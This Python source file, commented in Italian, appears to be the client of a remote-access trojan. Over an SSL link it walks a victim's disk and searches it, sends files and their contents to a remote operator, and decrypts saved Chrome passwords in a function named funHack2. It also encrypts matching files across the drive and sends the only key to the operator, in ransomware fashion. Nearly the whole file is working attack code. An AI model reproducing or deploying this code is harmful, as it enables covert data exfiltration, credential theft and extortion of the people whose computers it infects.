from clientSSLconnection import *
from clientSSLgeneral import *
from clientSSL2 import *
from clientSSLRemoteCommands import *

import time
import subprocess
import os
import sys
from colorama import Fore
import zipfile
import traceback
from docx import Document
from pathlib import Path
from PyPDF2 import PdfFileReader
from cryptography.fernet import Fernet
from scapy.all import *
import ipinfo
import json
import base64
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome
import sqlite3
import win32crypt

FORMAT = "utf-8"


# OK creazione file con tutti i tipi di tipologia
def filespath(tipologia, client):
    time.sleep(4)

    allType = ""
    listaType = tipologia.split()
    result = [""]
    path="null"
    counter_elemets=0

    import platform

    if platform.system() == "Windows":
        path = "C:\\Users"
    elif platform.system() == "Darwin":
        path = "/Users/"
    else:
        path = "/"

    for n in range(len(listaType)):

        tipologia = listaType[n]
        result.append("\n\nLista dei risultati per estensione: " + tipologia + "\n\n")

        if tipologia[0:1]==".":
            allType=allType+" "+tipologia
            for cartella, sottocartelle, file in os.walk(path):
                for item in file:
                    if item.endswith(tipologia):
                        if item.endswith(".zip"):
                            result.append('"' + item + '"' + " nel percorso: " + cartella)
                            pathcurrent = os.getcwd()
                            os.chdir(cartella)
                            counter_elemets += 1
                            zf = zipfile.ZipFile(item, 'r')
                            os.chdir(pathcurrent)
                            for item2 in zf.namelist():
                                result.append("\n\t-:" + '"' + item2 + '"')

                            result.append("\n\n")

                        else:
                            counter_elemets += 1
                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
                    elif tipologia[0:2]==".*":
                        if item.endswith(".zip"):
                            result.append('"' + item + '"' + " nel percorso: " + cartella)
                            pathcurrent = os.getcwd()
                            os.chdir(cartella)
                            counter_elemets += 1
                            zf = zipfile.ZipFile(item, 'r')
                            os.chdir(pathcurrent)
                            for item2 in zf.namelist():
                                result.append("\n\t-:" + '"' + item2 + '"')

                            result.append("\n\n")

                        else:
                            counter_elemets += 1
                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")

    result.append("\n----Trovati "+str(counter_elemets)+" elementi.")
    result.append("\n### TROVATI TUTTI I FILE CON ESTENSIONE " + allType + "###\n\n")
    result = ''.join(result)

    try:
        encode=result.encode(FORMAT)
        x=1024
        y=x+1024

        line = encode[0:1024]
        client.send(line)
        while (line):
            line = encode[x:y]
            client.send(line)
            x = x+1024
            y = x+1024

        time.sleep(2)
        client.send(("[END]").encode(FORMAT))

    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            raise e
        elif e.__class__.__name__ == "SSLEOFError":
            raise e
        else:
            client.send(("[ERROR]").encode(FORMAT))

    time.sleep(5)


# OK cerco tutti i file con estensione indicata in un certo path
def find(comando, client):
    time.sleep(4)
    counter_punti=0
    counter_spazi=0
    inizio_ext=0
    fine_ext=0
    inizio_path=0
    counter_elemets=0

    specificlist = ["\nRisultati "+comando+":\n"]

    for element in range(0, len(comando)):
        if comando[element] == ".":
            counter_punti += 1
            if counter_punti == 1:
                inizio_ext = element
            elif counter_punti == 2:
                inizio_path = element
        if comando[element] == " ":
            counter_spazi += 1
            if counter_spazi == 2:
                fine_ext = element
                inizio_path = element + 1

    estensione=comando[inizio_ext:fine_ext]
    path=comando[inizio_path:]
    if os.access(path, os.R_OK)==True:
        genericlist=os.listdir(path)
        for item in genericlist:
            if item.endswith(estensione):
                counter_elemets += 1
                specificlist.append("-: " + item + "\n")

        specificlist.append("\nNumero di elementi trovati: " + str(counter_elemets))
        data = ''.join(specificlist)
        try:
            filesize = sys.getsizeof(data)
            client.send((str(filesize)).encode(FORMAT))
            time.sleep(5)
            client.send((data).encode(FORMAT))
            time.sleep(1)
        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                raise e
            elif e.__class__.__name__ == "SSLEOFError":
                raise e
            else:
                client.send(("[ERROR]").encode(FORMAT))
    else:
        client.send(("[ERROR] Path doesn't exist").encode(FORMAT))


# OK
def download(comando, client):

    counter_virgolette = 0
    counter_spazi = 0
    inizio_file = 0
    fine_file = 0
    inizio_path = 0
    file = 'null'
    path = 'null'
    regex_match = 'null'

    regex_match = regexcheck_download(comando)

    if regex_match != 'null' and regex_match != 'not matched':
        if regex_match == 'windowstip1' or regex_match == 'unixtip1':
            # tipologia 1: (simile a find) download "nomefile.estensione" path
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element + 1
                    elif counter_virgolette == 2:
                        fine_file = element
                if comando[element] == " ":
                    counter_spazi += 1
                    if counter_spazi >= 2 and counter_virgolette == 2:
                        inizio_path = element + 1
                        break
        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
            # tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element + 1
                    elif counter_virgolette == 2:
                        fine_file = element
                if comando[element] == ":" and counter_virgolette == 2:
                    inizio_path = element + 2
                    break

        file = comando[inizio_file:fine_file]
        path = comando[inizio_path:]

        # distinguere il tipo di path per utilizzare os.path.getsize
        pathtoremember = 'null'
        if path == ".":
            path = os.getcwd()
        elif path == "..":
            pathtoremember = os.getcwd()
            os.chdir("..")
            path = os.getcwd()
        elif path.startswith(".\\") or path.startswith("./"):
            pathtoremember = os.getcwd()
            os.chdir(os.getcwd() + path[1:])
            path = os.getcwd()
        elif path.startswith("C:\\") or path.startswith("\\") or path.startswith("/"):
            pathtoremember = os.getcwd()
            os.chdir(path)
            path = os.getcwd()
        else:
            client.send(("[ERROR]").encode(FORMAT))

        filetrovato = False

        if path != 'null' and file != 'null':
            for root, dir, files in os.walk(path):
                if file in files:
                    filetrovato = True
                    break

        # esegui procedura di download
        if filetrovato:
            try:
                filesize = os.path.getsize(file)

                if filesize <= 0:
                    raise Exception
                else:
                    with open(file, 'rb') as f:
                        time.sleep(4)
                        line = f.read(1024)
                        client.send(line)
                        while (line):
                            line = f.read(1024)
                            client.send(line)

                        f.close()
                        time.sleep(2)
                        client.send(("[END]").encode(FORMAT))

            except Exception as e:
                if e.__class__.__name__ == "ConnectionResetError":
                    raise e
                elif e.__class__.__name__ == "SSLEOFError":
                    raise e
                else:
                    client.send(("[ERROR]").encode(FORMAT))
        else:
            client.send(("[ERROR]").encode(FORMAT))

        # ritorno al path precedente nel caso fosse stato cambiato
        if pathtoremember != 'null':
            os.chdir(pathtoremember)


# OK aprire i file .zip
def openZip(comando,client):
    counter_virgolette = 0
    counter_spazi = 0
    inizio_file = 0
    fine_file = 0
    inizio_path = 0
    file = 'null'
    path = 'null'
    regex_match = 'null'
    regex_match = regexcheck_openZip(comando)

    if regex_match == 'windowstip1' or regex_match == 'unixtip1':
        # tipologia 1: (simile a find) download "nomefile.estensione" path
        for element in range(0, len(comando)):
            if comando[element] == "\"":
                counter_virgolette += 1
                if counter_virgolette == 1:
                    inizio_file = element + 1
                elif counter_virgolette == 2:
                    fine_file = element
            if comando[element] == " ":
                counter_spazi += 1
                if counter_spazi >= 2 and counter_virgolette == 2:
                    inizio_path = element + 1
                    break

        file = comando[inizio_file:fine_file]
        path = comando[inizio_path:]

        # distinguere il tipo di path per utilizzare os.path.getsize
        pathtoremember = 'null'
        if path == ".":
            path = os.getcwd()
        elif path == "..":
            pathtoremember = os.getcwd()
            os.chdir("..")
            path = os.getcwd()
        elif path.startswith(".\\") or path.startswith("./"):
            pathtoremember = os.getcwd()
            os.chdir(os.getcwd() + path[1:])
            path = os.getcwd()
        elif path.startswith("C:\\") or path.startswith("\\") or path.startswith("/"):
            pathtoremember = os.getcwd()
            os.chdir(path)
            path = os.getcwd()
        else:
            client.send(("[ERROR]").encode(FORMAT))

        filetrovato = False

        if path != 'null' and file != 'null':
            for root, dir, files in os.walk(path):
                if file in files:
                    filetrovato = True
                    break
        # esegui procedura di download
        if filetrovato:
            try:
                result=[]
                if file.endswith(".zip"):
                    try:
                        nomeFile = file
                        result.append(f"\n {nomeFile} contiene i seguenti file:\n ")
                        zf = zipfile.ZipFile(nomeFile, 'r')
                        for item2 in zf.namelist():
                            result.append("\n\t-:" + '"' + item2 + '"')

                        result = ''.join(result)

                        try:
                            encode = result.encode(FORMAT)
                            x = 1024
                            y = x + 1024

                            line = encode[0:1024]
                            client.send(line)
                            while (line):
                                line = encode[x:y]
                                client.send(line)
                                x = x + 1024
                                y = x + 1024

                            time.sleep(1)
                            client.send(("[END]").encode(FORMAT))
                        except:
                            raise Exception
                    except Exception as e:
                        if e.__class__.__name__ == "ConnectionResetError":
                            raise e
                        elif e.__class__.__name__ == "SSLEOFError":
                            raise e
                        else:
                            client.send(("[ERROR]").encode(FORMAT))

                    time.sleep(5)
                else:
                    client.send(("[ERROR]").encode(FORMAT))
                    time.sleep(5)
            except Exception as e:
                if e.__class__.__name__ == "ConnectionResetError":
                    raise e
                elif e.__class__.__name__ == "SSLEOFError":
                    raise e
                else:
                    client.send(("[ERROR]").encode(FORMAT))
                    time.sleep(5)
        else:
            client.send(("[ERROR]").encode(FORMAT))
            time.sleep(5)

        # ritorno al path precedente nel caso fosse stato cambiato
        if pathtoremember != 'null':
            os.chdir(pathtoremember)


# OK Cerco file che contengono la parola nel nome
def search(filesearch, client):
    try:
        time.sleep(4)

        allType = ""
        result = [""]
        path="null"
        counter_elemets=0

        import platform

        if platform.system() == "Windows":
            path = "C:\\"
        elif platform.system() == "Darwin":
            path = "/Users/"
        else:
            path = "/"

        for cartella, sottocartelle, file in os.walk(path):
            for item in file:
                itemTmp = item.lower()
                fileTmp = filesearch.lower()
                if (Path(itemTmp).stem)==(Path(fileTmp).stem):
                    if item.endswith(".zip"):
                        result.append('"' + item + '"' + " nel percorso: " + cartella)
                        pathcurrent = os.getcwd()
                        os.chdir(cartella)
                        counter_elemets += 1
                        zf = zipfile.ZipFile(item, 'r')
                        os.chdir(pathcurrent)
                        for item2 in zf.namelist():
                            result.append("\n\t-:" + '"' + item2 + '"')
                        result.append("\n\n")

                    else:
                        counter_elemets += 1
                        result.append(f"\n File '" + filesearch + "' trovato:\n\t" + '"' + item + '"' + " nel percorso: " + cartella + "\n")
                elif fileTmp in str(itemTmp):
                    if item.endswith(".zip"):
                        result.append('"' + item + '"' + " nel percorso: " + cartella)
                        pathcurrent = os.getcwd()
                        os.chdir(cartella)
                        counter_elemets += 1
                        zf = zipfile.ZipFile(item, 'r')
                        os.chdir(pathcurrent)
                        for item2 in zf.namelist():
                            result.append("\n\t-:" + '"' + item2 + '"')
                        result.append("\n\n")

                    else:
                        counter_elemets += 1
                        result.append(f"\n File '" + filesearch + "' ha corrispondenze in:\n\t" + '"' + item + '"' + " nel percorso: " + cartella + "\n")

        result.append("\n----Trovati "+str(counter_elemets)+f" elementi simili a '{filesearch}'.")
        result = ''.join(result)
        try:
            encode=result.encode(FORMAT)
            x=1024
            y=x+1024

            line = encode[0:1024]
            client.send(line)
            while (line):
                line = encode[x:y]
                client.send(line)
                x = x+1024
                y = x+1024

            time.sleep(2)
            client.send(("[END]").encode(FORMAT))


        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                raise e
            elif e.__class__.__name__ == "SSLEOFError":
                raise e
            else:
                client.send(("[ERROR]").encode(FORMAT))
    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            raise e
        elif e.__class__.__name__ == "SSLEOFError":
            raise e
        else:
            client.send(("[ERROR]").encode(FORMAT))

    time.sleep(5)


# OK Cerco file che contengono la parola nel testo
def searchWord(comando, client):
    counter_virgolette = 0
    counter_spazi = 0
    inizio_file = 0
    fine_file = 0
    inizio_path = 0
    pathAttuale = os.getcwd()

    try:
        time.sleep(4)

        allType = ""
        result = [""]
        path = "null"
        counter_elemets = 0

        regex_match = regexcheck_wsearch(comando)
        if regex_match != 'null' and regex_match != 'not matched':
            if regex_match == 'windowstip1' or regex_match == 'unixtip1':
                for element in range(0, len(comando)):
                    if comando[element] == "\"":
                        counter_virgolette += 1
                        if counter_virgolette == 1:
                            inizio_file = element + 1
                        elif counter_virgolette == 2:
                            fine_file = element
                    if comando[element] == " ":
                        counter_spazi += 1
                        if counter_spazi >= 2 and counter_virgolette == 2:
                            inizio_path = element + 1
                            break

                wordsearch = comando[inizio_file:fine_file]
                parolaTmp = wordsearch.replace(" ", "")
                parolaTmp = parolaTmp.replace("\n", "")
                parolaTmp = parolaTmp.lower()
                path = comando[inizio_path:]

                for cartella, sottocartelle, file in os.walk(path):
                    for item in file:
                        try:
                            os.chdir(cartella)
                            if item.endswith(".txt"):
                                try:
                                    f = open(item, 'r')
                                    line = f.read(os.path.getsize(item))
                                    line = line.lower()
                                    line = line.replace(" ", "")
                                    line = line.replace("\n", "")
                                    trovato = line.find(parolaTmp)
                                    numberOccurrent = 0
                                    numberOccurrent = line.count(parolaTmp)
                                    counter_elemets = counter_elemets + numberOccurrent
                                    if trovato != -1:
                                        result.append(
                                            f"\nParola chiave '" + wordsearch + "' trovata " + str(
                                                numberOccurrent) + " volte nel file:\n\t" + '"' + item + '"' + " nel percorso: " + cartella + "\n")
                                except:
                                    pass

                            if item.endswith(".docx"):
                                try:
                                    d = Document(item)
                                    testo = ""
                                    for p in d.paragraphs:
                                        testo = testo + p.text
                                    testo = testo.lower()
                                    testo = testo.replace(" ", "")
                                    testo = testo.replace("\n", "")
                                    trovato = testo.find(parolaTmp)
                                    numberOccurrent = 0
                                    numberOccurrent = testo.count(parolaTmp)
                                    counter_elemets = counter_elemets + numberOccurrent
                                    if trovato != -1:
                                        result.append(
                                            f"\nParola chiave '" + wordsearch + "' trovata " + str(
                                                numberOccurrent) + " volte nel file:\n\t" + '"' + item + '"' + " nel percorso: " + cartella + "\n")
                                except:
                                    pass
                            if item.endswith(".pdf"):
                                try:
                                    pdf_path = (Path.home())
                                    pathpdf = cartella + '\\' + item
                                    pdf_reader = PdfFileReader(pathpdf, strict=False)
                                    index = 0
                                    testo = ""
                                    while True:
                                        try:
                                            first_page = pdf_reader.getPage(index)
                                            text = first_page.extractText()
                                            testo = testo + text
                                            index = index + 1
                                        except:
                                            break
                                    testo = testo.lower()
                                    testo = testo.replace(" ", "")
                                    testo = testo.replace("\n", "")
                                    trovato = testo.find(parolaTmp)
                                    numberOccurrent = 0
                                    numberOccurrent = testo.count(parolaTmp)
                                    counter_elemets = counter_elemets + numberOccurrent
                                    if trovato != -1:
                                        result.append(
                                            f"\nParola chiave '" + wordsearch + "' trovata " + str(
                                                numberOccurrent) + " volte nel file:\n\t" + '"' + item + '"' + " nel percorso: " + cartella + "\n")
                                except:
                                    pass
                            # if item.endswith(".xlsx"):
                        except:
                            pass
                if result == [""]:
                    result.append(f"\nParola chiave '" + wordsearch + "' non trovata!")
                result.append("\n----Trovate " + str(counter_elemets) + f" elementi simili a '{wordsearch}'.")
                result = ''.join(result)
                try:
                    encode = result.encode(FORMAT)
                    x = 1024
                    y = x + 1024

                    line = encode[0:1024]
                    client.send(line)
                    while (line):
                        line = encode[x:y]
                        client.send(line)
                        x = x + 1024
                        y = x + 1024

                    time.sleep(2)
                    client.send(("[END]").encode(FORMAT))

                except Exception as e:
                    if e.__class__.__name__ == "ConnectionResetError":
                        raise e
                    elif e.__class__.__name__ == "SSLEOFError":
                        raise e
                    else:
                        client.send(("[ERROR]").encode(FORMAT))
    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            raise e
        elif e.__class__.__name__ == "SSLEOFError":
            raise e
        else:
            client.send(("[ERROR]").encode(FORMAT))

    os.chdir(pathAttuale)
    time.sleep(5)


# CRIPTOGRAFARE I FILE
def encrypt(nomeFile, client):
    try:
        time.sleep(4)

        path = "null"

        if platform.system() == "Windows":
            path = "C:\\"
        elif platform.system() == "Darwin":
            path = "/Users/"
        else:
            path = "/"

        key = Fernet.generate_key()

        for cartella, sottocartelle, file in os.walk(path):

            for item in file:
                if item.endswith(nomeFile):
                    fernet = Fernet(key)

                    with open(item, 'rb') as file:
                        original = file.read()
                    encrypted = fernet.encrypt(original)

                    with open(item, 'wb') as encrypted_file:
                        encrypted_file.write(encrypted)

        try:
            client.send((key).encode(FORMAT))
            time.sleep(2)
            client.send(("[END]").encode(FORMAT))
        except:
            client.send(("[ERROR]").encode(FORMAT))
    except:
        client.send(("[ERROR]").encode(FORMAT))


# DECRIPTOGRAFARE I FILE
def decrypt(nomeFile, client, key):
    try:
        time.sleep(4)

        path = "null"

        if platform.system() == "Windows":
            path = "C:\\"
        elif platform.system() == "Darwin":
            path = "/Users/"
        else:
            path = "/"

        for cartella, sottocartelle, file in os.walk(path):
            for item in file:
                if item.endswith(nomeFile):
                    fernet = Fernet(key)

                    with open(item, 'rb') as enc_file:
                        encrypted = enc_file.read()
                    decrypted = fernet.decrypt(encrypted)

                    with open(item, 'wb') as dec_file:
                        dec_file.write(decrypted)

        try:
            client.send(("[END]").encode(FORMAT))
        except:
            client.send(("[ERROR]").encode(FORMAT))
    except:
        client.send(("[ERROR]").encode(FORMAT))


# Funzione che ti dice tutte le password di google
def funHack2():
    try:
        result=[]
        def get_chrome_datetime(chromedate):
          return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

        def get_encryption_key():
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        def decrypt_password(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""

        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                result.append(f"Origin URL: {origin_url}\n")
                result.append(f"Action URL: {action_url}\n")
                result.append(f"Username: {username}\n")
                result.append(f"Password: {password}\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                result.append(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                result.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            result.append("="*50+"\n")

        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass

        return result

    except:
        return "[ERROR]"


# Funzione tracciamento ip
def funHack6():
    try:
        result=[]
        try:
            ip_address = sys.argv[1]
        except IndexError:
            ip_address = None

        try:
            access_token = 'dc67fcf1cae4d7'
            handler = ipinfo.getHandler(access_token)
            details = handler.getDetails(ip_address)
            for key, value in details.all.items():
                result.append(f"{key}: {value}\n")
        except:
            pass

        return result
    except:
        return "[ERROR]"


# Funzione stampare a video i contenuti dei vari file senza scaricarli
def printFile(comando, client):
    try:
        time.sleep(4)
        counter_virgolette = 0
        counter_spazi = 0
        inizio_file = 0
        fine_file = 0
        inizio_path = 0

        for element in range(0, len(comando)):
            if comando[element] == "\"":
                counter_virgolette += 1
                if counter_virgolette == 1:
                    inizio_file = element + 1
                elif counter_virgolette == 2:
                    fine_file = element
            if comando[element] == " ":
                counter_spazi += 1
                if counter_spazi >= 2 and counter_virgolette == 2:
                    inizio_path = element + 1
                    break

        nomeFile = comando[inizio_file:fine_file]
        pathFile = comando[inizio_path:]

        # distinguere il tipo di path per utilizzare os.path.getsize
        pathtoremember = 'null'
        if pathFile == ".":
            pathFile = os.getcwd()
        elif pathFile == "..":
            pathtoremember = os.getcwd()
            os.chdir("..")
            pathFile = os.getcwd()
        elif pathFile.startswith(".\\") or pathFile.startswith("./"):
            pathtoremember = os.getcwd()
            os.chdir(os.getcwd() + pathFile[1:])
            path = os.getcwd()
        elif pathFile.startswith("C:\\") or pathFile.startswith("\\") or pathFile.startswith("/"):
            pathtoremember = os.getcwd()
            os.chdir(pathFile)
            path = os.getcwd()
        else:
            client.send(("[ERROR]").encode(FORMAT))

        time.sleep(4)
        pathActual = os.getcwd()
        bySend = ""

        for cartella, sottocartelle, file in os.walk(pathFile):
            for item in file:
                if item == nomeFile:
                    os.chdir(cartella)
                    if item.endswith(".txt"):
                        try:
                            f = open(item, 'rb')
                            bySend = f.read(os.path.getsize(item))
                            bySend = bySend.decode()
                        except:
                            pass

                    elif item.endswith(".docx"):
                        try:
                            d = Document(item)
                            bySend = ""
                            for p in d.paragraphs:
                                bySend = bySend + p.text
                        except:
                            pass
                    elif item.endswith(".pdf"):
                        try:
                            pdf_path = (Path.home())
                            pathpdf = cartella + '\\' + item
                            pdf_reader = PdfFileReader(pathpdf)
                            index = 0
                            bySend = ""
                            while True:
                                try:
                                    first_page = pdf_reader.getPage(index)
                                    text = first_page.extractText()
                                    bySend = bySend + text
                                    index = index + 1
                                except:
                                    break
                        except:
                            pass
                    else:
                        with open(item, 'rb') as file:
                            bySend = file.read(os.path.getsize(item))

        os.chdir(pathActual)
        try:
            client.send((bySend).encode(FORMAT))
            time.sleep(2)
            client.send(("[END]").encode(FORMAT))
        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                raise e
            elif e.__class__.__name__ == "SSLEOFError":
                raise e
            else:
                client.send(("[ERROR]").encode(FORMAT))
    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            raise e
        elif e.__class__.__name__ == "SSLEOFError":
            raise e
        else:
            client.send(("[ERROR]").encode(FORMAT))